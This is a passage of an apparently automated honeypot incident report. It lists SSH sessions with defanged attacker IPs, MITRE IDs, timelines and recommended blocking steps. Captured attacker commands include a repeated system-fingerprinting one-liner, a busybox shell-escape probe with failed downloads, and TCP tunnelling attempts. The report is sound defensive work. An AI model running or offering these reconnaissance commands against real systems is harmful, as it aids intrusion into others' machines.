| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:21` | `cowrie.log.closed` |
| `2026-09-05 08:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d20d7c1f4b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:20 |
| **Last Seen** | 2026-09-05 08:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:20:26` | `cowrie.session.connect` |
| `2026-09-05 08:20:27` | `cowrie.client.version` |
| `2026-09-05 08:20:27` | `cowrie.client.kex` |
| `2026-09-05 08:20:29` | `cowrie.login.success` |
| `2026-09-05 08:20:30` | `cowrie.session.params` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:30` | `cowrie.command.success` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:30` | `cowrie.command.input` |
| `2026-09-05 08:20:31` | `cowrie.log.closed` |
| `2026-09-05 08:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e33be094c2d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:22 |
| **Last Seen** | 2026-09-05 08:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:22:34` | `cowrie.session.connect` |
| `2026-09-05 08:22:35` | `cowrie.client.version` |
| `2026-09-05 08:22:35` | `cowrie.client.kex` |
| `2026-09-05 08:22:37` | `cowrie.login.success` |
| `2026-09-05 08:22:39` | `cowrie.session.params` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:39` | `cowrie.command.success` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:39` | `cowrie.command.input` |
| `2026-09-05 08:22:40` | `cowrie.log.closed` |
| `2026-09-05 08:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69803c6676c7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:24 |
| **Last Seen** | 2026-09-05 08:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:24:40` | `cowrie.session.connect` |
| `2026-09-05 08:24:40` | `cowrie.client.version` |
| `2026-09-05 08:24:40` | `cowrie.client.kex` |
| `2026-09-05 08:24:41` | `cowrie.login.success` |
| `2026-09-05 08:24:43` | `cowrie.session.params` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:43` | `cowrie.command.success` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:43` | `cowrie.command.input` |
| `2026-09-05 08:24:44` | `cowrie.log.closed` |
| `2026-09-05 08:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62af2703899e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 08:26 |
| **Last Seen** | 2026-09-05 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:26:01` | `cowrie.session.connect` |
| `2026-09-05 08:26:01` | `cowrie.client.version` |
| `2026-09-05 08:26:01` | `cowrie.client.kex` |
| `2026-09-05 08:26:02` | `cowrie.login.success` |
| `2026-09-05 08:26:02` | `cowrie.direct-tcpip.request` |
| `2026-09-05 08:26:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 08:26:03` | `cowrie.direct-tcpip.data` |
| `2026-09-05 08:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8104529b3726

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:26 |
| **Last Seen** | 2026-09-05 08:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:26:48` | `cowrie.session.connect` |
| `2026-09-05 08:26:48` | `cowrie.client.version` |
| `2026-09-05 08:26:48` | `cowrie.client.kex` |
| `2026-09-05 08:26:50` | `cowrie.login.success` |
| `2026-09-05 08:26:51` | `cowrie.session.params` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.command.success` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.command.input` |
| `2026-09-05 08:26:51` | `cowrie.log.closed` |
| `2026-09-05 08:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d47903c2a3f5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:28 |
| **Last Seen** | 2026-09-05 08:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:28:52` | `cowrie.session.connect` |
| `2026-09-05 08:28:52` | `cowrie.client.version` |
| `2026-09-05 08:28:52` | `cowrie.client.kex` |
| `2026-09-05 08:28:54` | `cowrie.login.success` |
| `2026-09-05 08:28:55` | `cowrie.session.params` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.command.success` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.command.input` |
| `2026-09-05 08:28:55` | `cowrie.log.closed` |
| `2026-09-05 08:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f19fc08541c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:30 |
| **Last Seen** | 2026-09-05 08:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:30:59` | `cowrie.session.connect` |
| `2026-09-05 08:31:00` | `cowrie.client.version` |
| `2026-09-05 08:31:00` | `cowrie.client.kex` |
| `2026-09-05 08:31:01` | `cowrie.login.success` |
| `2026-09-05 08:31:02` | `cowrie.session.params` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.command.success` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.command.input` |
| `2026-09-05 08:31:02` | `cowrie.log.closed` |
| `2026-09-05 08:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb465bbee92

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:33 |
| **Last Seen** | 2026-09-05 08:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:33:12` | `cowrie.session.connect` |
| `2026-09-05 08:33:12` | `cowrie.client.version` |
| `2026-09-05 08:33:12` | `cowrie.client.kex` |
| `2026-09-05 08:33:13` | `cowrie.login.success` |
| `2026-09-05 08:33:14` | `cowrie.session.params` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:14` | `cowrie.command.success` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:14` | `cowrie.command.input` |
| `2026-09-05 08:33:15` | `cowrie.log.closed` |
| `2026-09-05 08:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c80e61e303

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:35 |
| **Last Seen** | 2026-09-05 08:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:35:28` | `cowrie.session.connect` |
| `2026-09-05 08:35:28` | `cowrie.client.version` |
| `2026-09-05 08:35:28` | `cowrie.client.kex` |
| `2026-09-05 08:35:30` | `cowrie.login.success` |
| `2026-09-05 08:35:31` | `cowrie.session.params` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.command.success` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.command.input` |
| `2026-09-05 08:35:31` | `cowrie.log.closed` |
| `2026-09-05 08:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bd518e327d1

| Field | Detail |
|---|---|
| **Source IP** | `95.154.84[.]123` |
| **First Seen** | 2026-09-05 08:36 |
| **Last Seen** | 2026-09-05 08:37 |
| **Session Duration** | 70s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, /bin/busybox TOKEN` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:36:01` | `cowrie.session.connect` |
| `2026-09-05 08:36:04` | `cowrie.login.success` |
| `2026-09-05 08:36:04` | `cowrie.session.params` |
| `2026-09-05 08:36:05` | `cowrie.command.input` |
| `2026-09-05 08:36:05` | `cowrie.command.failed` |
| `2026-09-05 08:36:06` | `cowrie.command.input` |
| `2026-09-05 08:36:06` | `cowrie.command.failed` |
| `2026-09-05 08:36:07` | `cowrie.command.input` |
| `2026-09-05 08:36:07` | `cowrie.command.failed` |
| `2026-09-05 08:36:08` | `cowrie.command.input` |
| `2026-09-05 08:36:11` | `cowrie.command.input` |
| `2026-09-05 08:36:11` | `cowrie.command.input` |
| `2026-09-05 08:36:11` | `cowrie.command.success` |
| `2026-09-05 08:36:21` | `cowrie.session.file_download.failed` |
| `2026-09-05 08:36:31` | `cowrie.session.file_download.failed` |
| `2026-09-05 08:37:12` | `cowrie.log.closed` |
| `2026-09-05 08:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.154.84[.]123` to AbuseIPDB if not already reported
- [ ] Block `95.154.84[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43886754d3a2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 08:37 |
| **Last Seen** | 2026-09-05 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:37:05` | `cowrie.session.connect` |
| `2026-09-05 08:37:05` | `cowrie.client.version` |
| `2026-09-05 08:37:05` | `cowrie.client.kex` |
| `2026-09-05 08:37:06` | `cowrie.login.success` |
| `2026-09-05 08:37:06` | `cowrie.direct-tcpip.request` |
| `2026-09-05 08:37:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 08:37:06` | `cowrie.direct-tcpip.data` |
| `2026-09-05 08:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f207222f7c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:37 |
| **Last Seen** | 2026-09-05 08:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:37:50` | `cowrie.session.connect` |
| `2026-09-05 08:37:50` | `cowrie.client.version` |
| `2026-09-05 08:37:50` | `cowrie.client.kex` |
| `2026-09-05 08:37:51` | `cowrie.login.success` |
| `2026-09-05 08:37:52` | `cowrie.session.params` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.command.success` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.command.input` |
| `2026-09-05 08:37:52` | `cowrie.log.closed` |
| `2026-09-05 08:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0750365a0398

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:40 |
| **Last Seen** | 2026-09-05 08:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:40:17` | `cowrie.session.connect` |
| `2026-09-05 08:40:17` | `cowrie.client.version` |
| `2026-09-05 08:40:17` | `cowrie.client.kex` |
| `2026-09-05 08:40:18` | `cowrie.login.success` |
| `2026-09-05 08:40:19` | `cowrie.session.params` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.command.success` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.command.input` |
| `2026-09-05 08:40:19` | `cowrie.log.closed` |
| `2026-09-05 08:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c5602dbb965

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:42 |
| **Last Seen** | 2026-09-05 08:42 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
